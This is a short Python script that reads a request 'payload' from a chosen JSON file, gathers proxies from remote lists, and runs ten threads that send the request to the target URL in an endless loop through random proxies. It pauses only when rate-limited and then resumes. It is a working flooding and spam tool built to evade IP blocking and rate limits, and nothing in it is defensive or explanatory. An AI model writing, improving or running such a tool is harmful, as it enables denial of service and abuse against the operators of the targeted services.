# import required libraries
from colorama import Fore as Colour
import requests
import random
import threading
import time
import json
import os

# load payload
files = os.listdir()
for f in files.copy():
	if not f.endswith(".json") or f == "proxies.json":
		files.remove(f)
if len(files) == 0:
	print(f"{Colour.LIGHTRED_EX}no json files to use as payload in running dir.{Colour.RESET}")
	exit(1)
for f in range(len(files)):
	print(f"{Colour.LIGHTBLACK_EX}{f+1}.{Colour.LIGHTCYAN_EX} {files[f]}{Colour.RESET}")
PAYLOAD = files[int(input("select (by index): "))-1]
print() #nl
with open(PAYLOAD, "r") as pl:
	raw = json.load(pl)
	URL = raw["url"]
	print(f"url: {Colour.LIGHTCYAN_EX}{URL}{Colour.RESET}")
	HEADERS = raw.get("headers")
	print(f"headers: {Colour.LIGHTCYAN_EX}{HEADERS}{Colour.RESET}")
	METHOD = raw.get("method", "POST")
	print(f"method: {Colour.LIGHTCYAN_EX}{METHOD}{Colour.RESET}")
	DATA = raw.get("data")
	print(f"data: {Colour.LIGHTCYAN_EX}{DATA}{Colour.RESET}")
	pl.close()
print() #nl

# config and stuffs, get proxies
print(f"{Colour.LIGHTMAGENTA_EX}fetching proxies... (this may take a while){Colour.RESET}")
PROXIES = [{"http": x } for x in [requests.get(y).content.decode().split() for y in json.load(open("./proxies.json", "r"))]]
THREADS = 10
SLEEP = 5 # 5 second sleep (can be changed)

c = True

print() #nl
def raw_dog(x: int):
	p = 0
	while c:
		res = requests.request(METHOD, URL, headers=HEADERS, data=DATA, proxies=random.choice(PROXIES))
		if res.status_code > 299 or res.status_code < 200:
			if res.status_code == 429:
				print(f"{Colour.LIGHTRED_EX}sending too many requests, sleeping for {SLEEP} seconds.{Colour.RESET}")
				time.sleep(SLEEP)
			else:
				print(f"{Colour.LIGHTRED_EX}{res.content.decode()}{Colour.RESET}")
		else:
			p += 1
			print(f"{Colour.LIGHTGREEN_EX}{x}: sent {p} payload(s)...{Colour.RESET}")
	print(f"{Colour.LIGHTYELLOW_EX}thread {x} shutting down...{Colour.RESET}")
try:
	for x in range(THREADS):
		threading.Thread(target=raw_dog, args=(x,)).start()
		print(f"{Colour.LIGHTGREEN_EX}starting {x} thread...")
		time.sleep(5)
except Exception as ex:
	print(f"{Colour.LIGHTRED_EX}{ex.with_traceback(None)}{Colour.RESET}")
	c = False

